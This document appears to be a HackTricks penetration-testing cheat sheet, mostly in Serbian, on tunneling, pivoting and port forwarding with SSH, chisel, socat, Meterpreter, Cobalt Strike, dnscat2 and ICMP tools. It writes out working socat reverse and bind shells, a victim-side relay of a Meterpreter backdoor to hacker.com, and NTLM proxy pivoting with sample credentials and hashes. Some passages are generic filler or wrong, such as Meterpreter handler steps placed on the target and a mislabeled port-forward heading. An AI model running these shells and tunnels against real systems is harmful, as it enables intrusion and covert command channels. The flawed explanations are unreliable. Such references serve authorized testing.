# Tuneliranje i prosleđivanje porta

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Nmap savet

{% hint style="warning" %}
**ICMP** i **SYN** skenovi ne mogu biti tunelirani kroz socks proxy, pa moramo **onemogućiti otkrivanje pinga** (`-Pn`) i specificirati **TCP skenove** (`-sT`) da bi ovo radilo.
{% endhint %}

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafička veza (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Lokalno preusmeravanje porta

Otvorite novi port na SSH serveru --> Drugi port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Lokalni port --> Kompromitovani host (SSH) --> Treća\_kutija:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Lokalni port --> Kompromitovani host (SSH) --> Gde god
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Obrnuto prosleđivanje porta

Ovo je korisno za dobijanje obrnutih shell-ova sa internih računara preko DMZ-a do vašeg računara:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunel

Potrebno vam je **root na oba uređaja** (jer ćete kreirati nove interfejse) i sshd konfiguracija mora dozvoljavati root prijavu:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Omogućite prosleđivanje na strani servera

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Enable forwarding for IPv6
echo 1 > /proc/sys/net/ipv6/conf/all/forwarding
```

Otvorite datoteku `/etc/sysctl.conf` i postavite sledeće vrednosti:

```bash
net.ipv4.ip_forward = 1
net.ipv6.conf.all.forwarding = 1
```

Pokrenite sledeću komandu da biste primenili promene:

```bash
sysctl -p
```
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Postavite novu rutu na strani klijenta
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Možete **tunelovati** sav **saobraćaj** ka **podmreži** preko jednog hosta putem **ssh**-a.\
Na primer, prosleđivanje sav saobraćaj koji ide ka 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Povežite se pomoću privatnog ključa
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Lokalni port --> Kompromitovani host (aktivna sesija) --> Treća\_kutija:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS

SOCKS (Socket Secure) je protokol za tuneliranje koji omogućava preusmeravanje mrežnog saobraćaja preko sigurne veze. Koristi se za omogućavanje udaljenog pristupa mrežnim resursima preko firewall-a. SOCKS koristi TCP/IP protokol i može se koristiti za tuneliranje različitih vrsta mrežnog saobraćaja, uključujući HTTP, FTP i SMTP.

Da biste koristili SOCKS, morate imati SOCKS server koji će poslužiti kao posrednik između vašeg računara i ciljnog servera. Kada uspostavite vezu sa SOCKS serverom, sav saobraćaj koji generišete preusmerava se preko tog servera. Ovo omogućava da se zaobiđu ograničenja mreže, kao što su firewall-i ili geografske blokade.

Da biste koristili SOCKS, morate konfigurisati svoj uređaj ili aplikaciju da koristi SOCKS proxy. Obično se to radi podešavanjem odgovarajućih postavki u mrežnim podešavanjima ili postavkama aplikacije. Nakon što je SOCKS proxy konfigurisan, sav saobraćaj koji generišete preusmerava se preko SOCKS servera.

SOCKS je koristan alat za tuneliranje i omogućava vam da zaobiđete ograničenja mreže i pristupite udaljenim resursima. Međutim, važno je napomenuti da SOCKS ne pruža enkripciju podataka. Ako želite obezbediti sigurnost vašeg saobraćaja, trebali biste koristiti dodatne metode enkripcije, kao što je korišćenje VPN-a zajedno sa SOCKS-om.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Još jedan način:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Otvorite port na tim serveru koji sluša na svim interfejsima koji mogu biti korišćeni za **usmeravanje saobraćaja kroz beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
U ovom slučaju, **port je otvoren na beacon hostu**, a ne na Team Serveru i saobraćaj se šalje na Team Server i odande na naznačeni host:port.
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Napomena:

- Beacon-ov reverzni port forward je dizajniran da **tunelira saobraćaj do Team Servera, a ne za preusmeravanje između pojedinačnih mašina**.
- Saobraćaj se **tunelira unutar Beacon-ovog C2 saobraćaja**, uključujući P2P veze.
- **Nisu potrebne administratorske privilegije** za kreiranje reverznih port forwarda na visokim portovima.

### Lokalni rPort2Port

{% hint style="warning" %}
U ovom slučaju, **port je otvoren na Beacon hostu**, a ne na Team Serveru i **saobraćaj se šalje Cobalt Strike klijentu** (ne Team Serveru) i odande do određenog hosta:porta.
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Potrebno je da otpremite web fajl tunel: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Možete ga preuzeti sa stranice za izdanja na [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Morate koristiti **istu verziju za klijenta i server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Prosleđivanje porta

Port forwarding (prosleđivanje porta) je tehnika koja omogućava preusmeravanje mrežnog saobraćaja sa jednog porta na drugi. Ova tehnika se često koristi u svetu hakovanja kako bi se omogućio pristup udaljenim servisima ili sistemima koji su inače nedostupni.

#### Kako funkcioniše?

Kada se koristi port forwarding, mrežni saobraćaj koji je usmeren ka određenom portu na jednom uređaju se preusmerava na drugi port na drugom uređaju. Na taj način, udaljeni servis ili sistem postaje dostupan preko lokalne mreže.

#### Vrste port forwardinga

Postoje tri osnovne vrste port forwardinga:

1. Local port forwarding (lokalno prosleđivanje porta): Ova tehnika omogućava pristup udaljenom servisu preko lokalnog računara. Sav saobraćaj koji je usmeren ka određenom lokalnom portu se preusmerava na udaljeni port na drugom računaru.

2. Remote port forwarding (udaljeno prosleđivanje porta): Ova tehnika omogućava pristup lokalnom servisu preko udaljenog računara. Saobraćaj koji je usmeren ka određenom udaljenom portu se preusmerava na lokalni port na drugom računaru.

3. Dynamic port forwarding (dinamičko prosleđivanje porta): Ova tehnika omogućava pristup različitim servisima preko jedne konekcije. Sav saobraćaj koji je usmeren ka određenom lokalnom portu se preusmerava na različite udaljene portove na drugim računarima.

#### Korišćenje port forwardinga u hakovanju

Port forwarding se često koristi u hakovanju kako bi se zaobišle sigurnosne mere i omogućio pristup sistemima ili servisima koji su inače nedostupni. Na primer, hakere mogu koristiti port forwarding kako bi pristupili udaljenom serveru preko lokalne mreže i izvršili napade ili krađu podataka.

#### Zaključak

Port forwarding je moćna tehnika koja omogućava preusmeravanje mrežnog saobraćaja sa jednog porta na drugi. Ova tehnika se često koristi u hakovanju kako bi se omogućio pristup nedostupnim sistemima ili servisima. Važno je biti svestan potencijalnih sigurnosnih rizika i koristiti port forwarding samo u legalne svrhe.
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Obrnuti tunel. Tunel se pokreće sa strane žrtve.\
Kreira se socks4 proxy na 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot preko **NTLM proxy-ja**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell

### Veza sa vezom
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell

### Obrnuti shell

Reverse shell je tehnika koja omogućava hakeru da preuzme kontrolu nad ciljanim računarom ili serverom. Umesto da haker napada direktno ciljni sistem, on prvo inficira žrtvin računar ili server sa zlonamernim kodom koji će se povezati sa hakerovim kontrolnim serverom. Kada se veza uspostavi, haker može izvršavati komande na ciljnom sistemu i preuzeti potpunu kontrolu.

Da bi se uspostavila veza između žrtvinog sistema i hakerovog kontrolnog servera, koristi se obrnuti shell. Ova tehnika koristi TCP/IP protokol za komunikaciju između dve strane. Haker prvo pokreće server na svom kontrolnom serveru, koji će osluškivati dolazne veze. Zatim, na žrtvinom sistemu, haker pokreće klijentski program koji će se povezati sa kontrolnim serverom.

Kada se veza uspostavi, haker može izvršavati komande na ciljnom sistemu kao da je direktno povezan sa njim. Ovo omogućava hakeru da izvršava različite napade, kao što su krađa podataka, instalacija zlonamernog softvera ili izvršavanje kompromitirajućih operacija.

Obrnuti shell je moćna tehnika koju hakeri često koriste u naprednim napadima. Kako bi se zaštitili od ovakvih napada, važno je redovno ažurirati softver, koristiti jake lozinke i implementirati sigurnosne mehanizme kao što su firewall-i i IDS/IPS sistemi.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port

Port2Port je tehnika koja omogućava usmeravanje mrežnog saobraćaja sa jednog porta na drugi. Ova tehnika se često koristi u hakovanju kako bi se omogućio pristup internim mrežnim resursima preko javne mreže.

Da biste koristili Port2Port, prvo morate uspostaviti tunel između dva računara. Postoje različiti alati i protokoli koji se mogu koristiti za uspostavljanje tunela, kao što su SSH, VPN i proxy serveri.

Kada je tunel uspostavljen, možete usmeriti saobraćaj sa jednog porta na drugi. Na primer, možete usmeriti saobraćaj sa porta 80 na port 8080. Na taj način, kada neko pristupi vašem računaru na portu 80, saobraćaj će biti preusmeren na port 8080.

Port2Port se često koristi u kombinaciji sa drugim tehnikama hakovanja, kao što su port skeniranje i ranjivosti aplikacija. Ova tehnika omogućava hakere da zaobiđu sigurnosne mehanizme i dobiju pristup internim resursima koji inače nisu dostupni preko javne mreže.

Važno je napomenuti da je korišćenje Port2Port tehnike u neovlašćene svrhe ilegalno i može imati ozbiljne pravne posledice. Ova tehnika se treba koristiti samo u okviru zakona i etičkih smernica, kao deo legitimnih aktivnosti testiranja bezbednosti ili administracije mreže.
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port kroz socks

Kada želite da uspostavite vezu između dva porta kroz SOCKS proxy, možete koristiti sledeći metodologiju:

1. Pokrenite SOCKS proxy server na vašem lokalnom računaru ili na udaljenom serveru.
2. Koristite alat poput `socat` ili `netcat` da biste uspostavili vezu sa SOCKS proxy serverom i prosledili podatke sa jednog porta na drugi.
3. Podesite lokalni ili udaljeni port na koji želite da usmerite podatke.
4. Podesite SOCKS proxy server da prosleđuje podatke sa tog porta na ciljni port na drugom računaru.

Na taj način, podaci će biti preusmereni sa jednog porta na drugi kroz SOCKS proxy server. Ovo je korisno kada želite da uspostavite vezu sa udaljenim portom koji nije direktno dostupan ili kada želite da sakrijete svoju stvarnu IP adresu.
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter putem SSL Socat-a

Da biste uspostavili sigurnu vezu između vašeg napadačkog računara i ciljnog sistema, možete koristiti SSL Socat. Ovaj alat omogućava enkripciju podataka koji se prenose između dve tačke.

Da biste koristili Meterpreter preko SSL Socat-a, sledite sledeće korake:

1. Prvo, generišite SSL sertifikat na napadačkom računaru. Možete koristiti alat kao što je OpenSSL za generisanje sertifikata.

2. Zatim, pokrenite Socat na napadačkom računaru koristeći generisani SSL sertifikat. Na primer, možete koristiti sledeću komandu:

   ```
   socat OPENSSL-LISTEN:443,cert=putanja/do/sertifikata,verify=0,fork TCP:localhost:4444
   ```

   Ova komanda će osluškivati na portu 443 i preusmeravati saobraćaj na lokalni port 4444.

3. Na ciljnom sistemu, pokrenite Meterpreter koristeći sledeću komandu:

   ```
   meterpreter > use exploit/multi/handler
   meterpreter > set payload windows/meterpreter/reverse_tcp
   meterpreter > set LHOST napadacki_ip
   meterpreter > set LPORT 443
   meterpreter > exploit
   ```

   Ove komande će konfigurisati Meterpreter da se poveže sa napadačkim računarom preko SSL Socat-a na portu 443.

4. Kada se ciljni sistem poveže na napadački računar, možete izvršavati različite komande i postići daljinsku kontrolu nad ciljnim sistemom.

Korišćenje SSL Socat-a sa Meterpreter-om omogućava sigurnu komunikaciju između napadačkog računara i ciljnog sistema, čime se smanjuje rizik od otkrivanja ili presretanja podataka.
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Možete zaobići **neautentifikovani proxy** izvršavanjem ove linije umesto poslednje u konzoli žrtve:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunel

**/bin/sh konzola**

Kreirajte sertifikate na obe strane: Klijent i Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Udaljeni Port2Port

Povežite lokalni SSH port (22) sa 443 portom napadačevog računara
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

To je kao konzolna verzija PuTTY-a (opcije su vrlo slične ssh klijentu).

Pošto će se ovaj binarni fajl izvršavati na žrtvinoj mašini i to je ssh klijent, moramo otvoriti naš ssh servis i port kako bismo mogli uspostaviti povratnu vezu. Zatim, da bismo preusmerili samo lokalno dostupan port na port našeg računara:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Morate biti lokalni administrator (za bilo koji port)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Potrebno je da imate **RDP pristup sistemu**.\
Preuzmite:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Ovaj alat koristi `Dynamic Virtual Channels` (`DVC`) iz funkcionalnosti Remote Desktop Service u Windows-u. DVC je odgovoran za **tuneliranje paketa preko RDP konekcije**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Na vašem klijentskom računaru učitajte **`SocksOverRDP-Plugin.dll`** na sledeći način:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Sada možemo **povezati** se sa **žrtvom** preko **RDP** koristeći **`mstsc.exe`**, i trebali bismo dobiti **prozor** koji kaže da je **SocksOverRDP dodatak omogućen**, i da će **slušati** na **127.0.0.1:1080**.

**Povežite** se putem **RDP** i prenesite i izvršite na žrtvinoj mašini binarni fajl `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Sada potvrdite na vašem računaru (napadaču) da port 1080 sluša:
```
netstat -antb | findstr 1080
```
Sada možete koristiti [**Proxifier**](https://www.proxifier.com/) **da biste usmjerili saobraćaj kroz taj port.**

## Proxify Windows GUI aplikacije

Možete omogućiti Windows GUI aplikacijama da koriste proxy pomoću [**Proxifier**](https://www.proxifier.com/).\
U **Profile -> Proxy Servers** dodajte IP adresu i port SOCKS servera.\
U **Profile -> Proxification Rules** dodajte ime programa koji želite da se koristi proxy i veze ka IP adresama koje želite da se koriste proxy.

## NTLM proxy zaobilaženje

Prethodno pomenuti alat: **Rpivot**\
**OpenVPN** takođe može zaobići to, postavljajući ove opcije u konfiguracionom fajlu:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Ovaj alat autentifikuje protiv proxy servera i vezuje lokalni port koji se prosleđuje ka spoljnoj usluzi koju specificirate. Zatim, možete koristiti alat po vašem izboru preko ovog porta.\
Na primer, prosleđuje port 443.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Sada, ako na primer postavite na žrtvi **SSH** servis da sluša na portu 443. Možete se povezati na njega preko napadačevog porta 2222.\
Takođe možete koristiti **meterpreter** koji se povezuje na localhost:443, a napadač sluša na portu 2222.

## YARP

Reverse proxy kreiran od strane Microsoft-a. Možete ga pronaći ovde: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Potreban je root na oba sistema da bi se kreirali tun adapteri i tunelovali podaci između njih koristeći DNS upite.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tunel će biti veoma spor. Možete kreirati kompresovanu SSH vezu kroz ovaj tunel koristeći:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Preuzmite ga ovde**](https://github.com/iagox86/dnscat2)**.**

Uspostavlja C\&C kanal putem DNS-a. Ne zahteva root privilegije.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **U PowerShell-u**

Možete koristiti [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) da pokrenete dnscat2 klijenta u PowerShell-u:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding sa dnscat-om**

Port forwarding is a technique used to redirect network traffic from one port to another. It can be useful in various scenarios, such as accessing a service running on a remote machine through a firewall or NAT device.

Dnscat is a tool that allows you to create a covert communication channel over the DNS protocol. It can be used for various purposes, including port forwarding.

To perform port forwarding with dnscat, you need to set up a DNS server that will handle the DNS requests. This server will act as a proxy between the client and the target machine.

Here are the steps to set up port forwarding with dnscat:

1. Install dnscat on both the client and the target machine.

2. Set up a DNS server on the target machine. This server will handle the DNS requests and forward them to the appropriate port.

3. Configure the client to use the DNS server set up in step 2.

4. Start the dnscat server on the target machine, specifying the port you want to forward.

5. Start the dnscat client on the client machine, specifying the DNS server set up in step 2.

6. Now, when the client sends a DNS request to the DNS server, the server will forward the request to the specified port on the target machine.

Port forwarding with dnscat can be a powerful technique for bypassing firewalls and accessing services on remote machines. However, it is important to use it responsibly and with proper authorization.
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Promena DNS-a u proxychains-u

Proxychains presreće `gethostbyname` libc poziv i tunelira tcp DNS zahtev kroz socks proxy. Podrazumevano, DNS server koji proxychains koristi je 4.2.2.2 (hardkodiran). Da biste ga promenili, izmenite fajl: _/usr/lib/proxychains3/proxyresolv_ i promenite IP adresu. Ako se nalazite u Windows okruženju, možete postaviti IP adresu kontrolera domena.

## Tuneli u Go-u

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP tuneliranje

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root privilegije su potrebne u oba sistema kako bi se kreirali tun adapteri i tunelirali podaci između njih koristeći ICMP echo zahteve.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Preuzmite ga ovde**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) je alatka za izlaganje rešenja na internetu jednom komandom.**
*URI za izlaganje su oblika:* **UID.ngrok.io**

### Instalacija

- Kreirajte nalog: https://ngrok.com/signup
- Preuzmite klijenta:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Osnovne upotrebe

**Dokumentacija:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*Takođe je moguće dodati autentifikaciju i TLS, ako je potrebno.*

#### Tunneliranje TCP-a
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Otkrivanje fajlova putem HTTP-a

Sometimes during a penetration test, you may come across a situation where you need to expose files from a target system. One way to achieve this is by using HTTP.

Ponekad tokom testiranja penetracije, možete se naći u situaciji gde je potrebno otkriti fajlove sa ciljnog sistema. Jedan način da se to postigne je korišćenjem HTTP protokola.

To expose files using HTTP, you can set up a simple web server on your local machine and use it to serve the files you want to expose. Here's how you can do it:

Da biste otkrili fajlove putem HTTP-a, možete postaviti jednostavan veb server na vašem lokalnom računaru i koristiti ga da poslužite fajlove koje želite otkriti. Evo kako to možete uraditi:

1. Install a web server software like Apache or Nginx on your local machine.

   Instalirajte softver za veb server kao što su Apache ili Nginx na vašem lokalnom računaru.

2. Configure the web server to serve the files from a specific directory.

   Konfigurišite veb server da posluži fajlove iz određenog direktorijuma.

3. Start the web server and make sure it is accessible from the network.

   Pokrenite veb server i proverite da li je dostupan sa mreže.

4. Copy the files you want to expose to the directory configured in step 2.

   Kopirajte fajlove koje želite otkriti u direktorijum konfigurisan u koraku 2.

5. Access the files using the IP address or domain name of your local machine and the appropriate port number.

   Pristupite fajlovima koristeći IP adresu ili ime domena vašeg lokalnog računara i odgovarajući broj porta.

By following these steps, you can expose files from a target system using HTTP. This can be useful in situations where you need to retrieve specific files during a penetration test.
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Snifovanje HTTP poziva

*Korisno za XSS, SSRF, SSTI ...*
Direktno iz stdout-a ili u HTTP interfejsu [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tuneliranje internog HTTP servisa
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Primer jednostavne konfiguracije ngrok.yaml

Otvara 3 tunela:
- 2 TCP
- 1 HTTP sa statičkim fajlovima izloženim iz /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Ostali alati za proveru

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

